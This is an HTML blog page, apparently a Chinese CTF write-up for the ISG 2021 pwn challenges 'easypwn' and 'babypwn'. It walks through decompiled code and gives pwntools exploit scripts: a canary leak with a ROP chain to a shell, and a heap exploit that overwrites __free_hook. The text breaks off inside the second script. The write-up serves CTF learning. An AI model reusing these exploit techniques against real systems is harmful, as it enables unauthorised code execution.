@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="easypwnmain函数，有三个自实现函数easyprintf和easyinput还有easymemset。 123456789101112131415161718192021222324252627int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  void *v3; &#x2F;&#x2F; rsi  char buf[">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ISG 2021 “观安杯” Pwn类型题目WriteUp">
+<meta property="og:url" content="http://startpwn.top/2021/09/04/ISG2021_Pwn/index.html">
+<meta property="og:site_name" content="Sp4rta&#39;s blog">
+<meta property="og:description" content="easypwnmain函数，有三个自实现函数easyprintf和easyinput还有easymemset。 123456789101112131415161718192021222324252627int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  void *v3; &#x2F;&#x2F; rsi  char buf[">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-09-04T15:46:53.000Z">
+<meta property="article:modified_time" content="2021-09-04T17:24:07.842Z">
+<meta property="article:author" content="ssta">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>ISG 2021 “观安杯” Pwn类型题目WriteUp</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/Links/">Links</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2021/08/31/Fword_pwn/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://startpwn.top/2021/09/04/ISG2021_Pwn/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://startpwn.top/2021/09/04/ISG2021_Pwn/&text=ISG 2021 “观安杯” Pwn类型题目WriteUp" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://startpwn.top/2021/09/04/ISG2021_Pwn/&title=ISG 2021 “观安杯” Pwn类型题目WriteUp" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://startpwn.top/2021/09/04/ISG2021_Pwn/&is_video=false&description=ISG 2021 “观安杯” Pwn类型题目WriteUp" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ISG 2021 “观安杯” Pwn类型题目WriteUp&body=Check out this article: http://startpwn.top/2021/09/04/ISG2021_Pwn/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://startpwn.top/2021/09/04/ISG2021_Pwn/&title=ISG 2021 “观安杯” Pwn类型题目WriteUp" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://startpwn.top/2021/09/04/ISG2021_Pwn/&title=ISG 2021 “观安杯” Pwn类型题目WriteUp" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://startpwn.top/2021/09/04/ISG2021_Pwn/&title=ISG 2021 “观安杯” Pwn类型题目WriteUp" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://startpwn.top/2021/09/04/ISG2021_Pwn/&title=ISG 2021 “观安杯” Pwn类型题目WriteUp" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://startpwn.top/2021/09/04/ISG2021_Pwn/&name=ISG 2021 “观安杯” Pwn类型题目WriteUp&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://startpwn.top/2021/09/04/ISG2021_Pwn/&t=ISG 2021 “观安杯” Pwn类型题目WriteUp" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#easypwn"><span class="toc-number">1.</span> <span class="toc-text">easypwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babypwn"><span class="toc-number">2.</span> <span class="toc-text">babypwn</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ISG 2021 “观安杯” Pwn类型题目WriteUp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Sp4rta's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-09-04T15:46:53.000Z" itemprop="datePublished">2021-09-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h3><p>main函数，有三个自实现函数easyprintf和easyinput还有easymemset。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">char</span> choice; <span class="comment">// [rsp+10Bh] [rbp-5h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  easyprintf(<span class="string">"Welcome to my easy pwn!\n"</span>, <span class="number">0L</span>L);</span><br><span class="line">  easyprintf(<span class="string">"First,I will give you a little gift!\n"</span>, <span class="number">0L</span>L);</span><br><span class="line">  easyprintf(<span class="string">"But it may make no sense!\n"</span>, <span class="number">0L</span>L);</span><br><span class="line">  easyprintf(<span class="string">"Do you want it?(y or n)\n"</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = (<span class="keyword">void</span> *)<span class="number">2</span>;</span><br><span class="line">  easyinput(&amp;choice, <span class="number">2L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( choice == <span class="string">'y'</span> || choice == <span class="string">'Y'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = &amp;easyinput;</span><br><span class="line">    easyprintf(<span class="string">"the gift is %p\n"</span>, &amp;easyinput);</span><br><span class="line">  &#125;</span><br><span class="line">  easyprintf(<span class="string">"Now you have two times to getshell!\n"</span>, v3);</span><br><span class="line">  easymemset(buf, <span class="number">0L</span>L, <span class="number">256L</span>L); <span class="comment">// buf的大小为0x100</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">    easyinput(buf, <span class="number">0x100</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到输入 Y/y 的话会打印出easyinput的地址，然后打开libeasy.so来看一下这三个函数的实现</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">easyinput</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+20h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">100u</span>LL); <span class="comment">// 实际传入的最大size为0x100，存在溢出</span></span><br><span class="line">  v2 = <span class="built_in">read</span>(<span class="number">0</span>, s, a2);</span><br><span class="line">  <span class="built_in">memcpy</span>(a1, s, a2);</span><br><span class="line">  s[v2 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your input: %s"</span>, a1);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到easyinput是存在溢出的，继续看下其他函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *__fastcall <span class="title">easymemset</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">size_t</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(a1, a2, a3);</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>easymemset函数没有异常，只是调用了memset。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">easyprintf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __va_list_tag arg[<span class="number">1</span>]; <span class="comment">// [rsp+20h] [rbp-D0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-B8h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-A8h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+50h] [rbp-A0h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+58h] [rbp-98h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+60h] [rbp-90h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+68h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  v9 = a2;</span><br><span class="line">  v10 = a3;</span><br><span class="line">  v11 = a4;</span><br><span class="line">  v12 = a5;</span><br><span class="line">  v13 = a6;</span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)a1 &lt;= <span class="number">0x401000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    arg[<span class="number">0</span>].gp_offset = <span class="number">8</span>;</span><br><span class="line">    va_start(arg, a6);</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">vfprintf</span>(<span class="built_in">stdout</span>, a1, arg);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You are bad!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>easyprintf好像也没什么异常，main函数里只调用了两次，参数并不可控，看来问题就在在easyinput的溢出点，回过头来看下面几行关键代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v2 = <span class="built_in">read</span>(<span class="number">0</span>, s, a2);</span><br><span class="line"><span class="built_in">memcpy</span>(a1, s, a2);</span><br><span class="line">s[v2 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Your input: %s"</span>, a1);</span><br></pre></td></tr></table></figure>
+
+<p>程序会先将我们输入的数据copy到a1中，长度为a2（0x100）。</p>
+<p>然后将s的最后一位置0，接着输出a1（到这里我意识到，置0的是s输出的是a1，copy完之后对他们两个的操作是没有影响的）</p>
+<p>想到了可以通过覆盖canary最低位的方法：</p>
+<ul>
+<li>输入105个字符覆盖到canary的最低位</li>
+<li>memcpy将输入+canary 复制到a1</li>
+<li>输入最后一位置0（还原canary）</li>
+<li>输出input+canary</li>
+<li>ROP</li>
+</ul>
+<p>第一次做漏洞点在.so里的题目，觉得还挺有意思。因为涉及到程序和库两个bin文件，IDA来回切换比较麻烦，所以就有了本文，也是分析+构造exp完整过程XD</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./easypwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./easypwn'</span>)</span><br><span class="line">libeasy = ELF(<span class="string">'./libeasy.so'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400903</span></span><br><span class="line">ret = <span class="number">0x000000000040061e</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'n)\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'gift is '</span>)</span><br><span class="line">libeasy.address = int(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-libeasy.sym[<span class="string">'easyinput'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libeasy:'</span>,hex(libeasy.address)</span><br><span class="line"></span><br><span class="line">libc.address = libeasy.address<span class="number">-0x203000</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc:'</span>,hex(libc.address)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'shell!\n'</span>)</span><br><span class="line">p.send(<span class="string">'A'</span>*<span class="number">105</span>)</span><br><span class="line">p.recvuntil(<span class="string">'A'</span>*<span class="number">104</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>))<span class="number">-0x41</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'canary:'</span>,hex(canary)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># payload = 'A'*104</span></span><br><span class="line">payload = p64(ret)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(libc.search(<span class="string">'/bin/sh'</span>).next())</span><br><span class="line">payload += p64(libc.sym[<span class="string">'system'</span>])</span><br><span class="line">payload += <span class="string">'A'</span>*(<span class="number">104</span>-len(payload))</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line"><span class="comment"># payload += p64(libc.search('/bin/sh').next())</span></span><br><span class="line"><span class="comment"># payload += p64(libc.sym['system'])</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h3><p>这个题完全是被lime带飞了！</p>
+<p>libc版本为2.31，可以先将chunk放到unsortedbin 然后再申请一个比较小的chunk，利用残留指针泄漏</p>
+<p>给了个后门函数，在全局指针的下方可以写数据，但是只能操作一次</p>
+<p>edit一次，本题关键点就在edit，👇看看edit的代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __usercall edit@&lt;rax&gt;(__int64 a1@&lt;rbp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp-18h] [rbp-18h] // int 不是int64！！</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v4 = a1;</span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( edit_bit &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    --edit_bit;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"message index:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%ld"</span>, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; *(_QWORD *)&amp;v2 &lt;= <span class="number">31L</span>L ) <span class="comment">// 对v2进行了类型转换</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"new content:"</span>);</span><br><span class="line">      read_n(*(<span class="keyword">void</span> **)(chunk_ptr[*(_QWORD *)&amp;v2] + <span class="number">8L</span>L), *(_DWORD *)chunk_ptr[*(_QWORD *)&amp;v2]);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"finish!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"error index!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在判断的时候是有两个判断条件的：</p>
+<ol>
+<li>v2是否大于等于0</li>
+<li>类型转换后的v2是否小于31</li>
+</ol>
+<p>最后利用了<code>-0x7fffffffffffffe0</code>来绕过这个if语句，首先这个值在内存里是-32，但是v2是4 byte长度，这样就产生了截断，低四位值为32，条件1成立。其次在第二次比较时进行了类型转换长度变为8 byte，没有产生截断，依旧为-32满足小于31，故条件2成立，绕过if。</p>
+<p>利用步骤是：</p>
+<ul>
+<li>泄漏出heap地址和libc地址</li>
+<li>写后门，将32的位置指向一个可控堆（内容为<code>__free_hook</code>地址）</li>
+<li>调用edit将<code>__free_hook</code>值修改为<code>system</code></li>
+<li>调用free</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.Q:</span><br><span class="line">	io=remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io=process(<span class="string">"./babypwn"</span>)</span><br><span class="line">libc=ELF(<span class="string">"./libc.so"</span>)</span><br><span class="line">sla=<span class="keyword">lambda</span> a,b : io.sendlineafter(a,b)</span><br><span class="line">sa =<span class="keyword">lambda</span> a,b : io.sendafter(a,b)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(c)</span>:</span></span><br><span class="line">	sla(<span class="string">"exit\n"</span>,str(c))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(sz,ct=<span class="string">"a"</span>)</span>:</span></span><br><span class="line">	choice(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">"size:\n"</span>,str(sz))</span><br><span class="line">	sa(<span class="string">"content:\n"</span>,ct)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	choice(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">"index:\n"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">	choice(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">"index:\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,ct)</span>:</span></span><br><span class="line">	choice(<span class="number">4</span>)</span><br><span class="line">	sla(<span class="string">"index:\n"</span>,str(idx))</span><br><span class="line">	sa(<span class="string">"content:\n"</span>,ct)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back</span><span class="params">(name)</span>:</span></span><br><span class="line">	choice(<span class="number">5</span>)</span><br><span class="line">	sla(<span class="string">"name:\n"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">		add(<span class="number">0x90</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">		dele(i+<span class="number">1</span>)</span><br><span class="line">	dele(<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">		add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">	add(<span class="number">0x40</span>)</span><br><span class="line">	show(<span class="number">7</span>)</span><br><span class="line">	leak=u64(io.recvuntil(<span 